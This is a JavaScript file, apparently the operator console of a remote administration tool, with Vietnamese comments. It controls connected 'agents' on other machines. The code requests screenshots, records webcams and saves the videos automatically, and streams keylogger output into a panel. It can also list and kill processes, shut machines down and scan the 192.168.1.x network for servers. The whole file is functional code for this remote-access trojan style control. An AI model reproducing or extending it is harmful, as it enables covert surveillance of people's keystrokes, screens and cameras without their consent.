import { CONFIG } from './modules/config.js';
import { Gateway } from './modules/gateway.js';
import { LanScanner } from './modules/scanner.js';

const appState = {
    isConnected: false,
    sessionId: null,
    agents: [],
    currentTarget: 'ALL'
};

// UI Helpers
const ui = {
    log: (src, msg) => console.log(`%c[${src}] ${msg}`, 'color: #00ff00'),
    error: (src, msg) => console.log(`%c[${src}] ${msg}`, 'color: #ff0000'),
    updateAgentList: (agents) => console.table(agents)
};

const gateway = new Gateway({
    onConnected: () => {
        console.log(`[System] Connected to Gateway.`);
        appState.isConnected = true;
        gateway.refreshAgents();
    },

    onDisconnected: () => {
        console.warn("[System] Disconnected from Gateway.");
        appState.isConnected = false;
        appState.agents = [];
    },
    onAuthSuccess: () => {
         console.log("[System] Auth Successful!");
    },
    onAgentListUpdate: (agentList) => {
        console.log("[System] Agent List Updated:", agentList);
        appState.agents = agentList;
        if (appState.currentTarget !== 'ALL' && !agentList.includes(appState.currentTarget)) {
            console.warn(`[System] Target ${appState.currentTarget} offline. Resetting to ALL.`);
            appState.currentTarget = 'ALL';
            gateway.setTarget('ALL');
        }
        ui.updateAgentList(agentList);
    },

    onScreenshot: (base64Data, agentId) => {
        console.log(`Hiển thị ảnh từ ${agentId}`);
        const modal = document.getElementById('image-modal');
        const img = document.getElementById('modal-img');
        
        img.src = "data:image/jpeg;base64," + base64Data;
        modal.classList.remove('hidden');
    },

    onCamera: (videoData, agentId) => {
        console.log(`Nhận video từ ${agentId}, lưu file...`);
        const link = document.createElement('a');
        link.href = "data:video/mp4;base64," + videoData;
        link.download = `cam_${agentId}_${Date.now()}.mp4`;
        link.click();
    },

    onKeylog: (keyData, agentId) => {
        const keylogPanel = document.getElementById('keylog-panel');
        if (keylogPanel) {
            keylogPanel.value += keyData;
            keylogPanel.scrollTop = keylogPanel.scrollHeight;
        }
        console.log(`[Keylog ${agentId}]: ${keyData}`);
    },

    onMessage: (msg) => {
        console.log("System Msg: ", msg);
    },
    onError: (err) => {
        console.error("[Main] Error:", err);
    }
});

const scanner = new LanScanner();


window.connect = (ip = 'localhost') => {
    gateway.connect(ip);
};

window.auth = () => {
    gateway.authenticate();
};

window.scan = () => {
    console.log("[Main] Scanning network (192.168.1.x)...");
    scanner.scan("192.168.1.", (foundIp) => {
        console.log(`%c[Main] Found server: ${foundIp}`, 'color: yellow');
        gateway.connect(foundIp);
    });
};

window.setTarget = (agentId) => {
    appState.currentTarget = agentId;
    gateway.setTarget(agentId);
    console.log(`[Control] Target locked: ${agentId}`);
}

window.listApps = () => {
    console.log("[CMD] Fetching App List...");
    gateway.fetchAppList();
};

window.startApp = (id) => {
    console.log(`[CMD] Starting App ID: ${id}`);
    gateway.startApp(id);
};

window.stopApp = (id) => {
    console.log(`[CMD] Stopping App ID: ${id}`);
    gateway.killApp(id);
};

window.listProcs = () => {
    console.log("[CMD] Fetching Process List...");
    gateway.fetchProcessList();
};

window.startProc = (id) => {
    console.log(`[CMD] Starting Process ID: ${id}`);
    gateway.startProcess(id); 
};

window.stopProc = (id) => {
    console.log(`[CMD] Stopping Process ID: ${id}`);
    gateway.killProcess(id);
};

window.whoami = () => {
    gateway.send(CONFIG.CMD.WHOAMI, "");
};

window.echo = (text) => {
    gateway.send(CONFIG.CMD.ECHO, text);
};

window.screenshot = () => {
    console.log(`[CMD] Taking Screenshot...`);
    gateway.send(CONFIG.CMD.SCREENSHOT, "");
};

window.recordCam = (duration = 5) => {
    console.log(`[CMD] Recording Webcam for ${duration}s...`);
    gateway.send(CONFIG.CMD.CAM_RECORD, String(duration));
};

window.shutdownAgent = () => {
    if(confirm("Are you sure you want to SHUTDOWN remote machine?")) {
        gateway.send(CONFIG.CMD.SHUTDOWN, "");
    }
}

document.addEventListener('DOMContentLoaded', () => {
    console.clear();
    console.log("%c=== CONSOLE CONTROL PANEL ===", "color: #fff; background: #8b5cf6; font-size: 16px; padding: 5px; border-radius: 4px;");
    console.log("1. Gọi `connect('localhost')` hoặc `connect('IP_SERVER')`");
    console.log("2. Sau khi connect, gọi `auth()` để đăng nhập.");
    console.log("3. Dùng `setTarget('AgentID')` để điều khiển cụ thể.");
});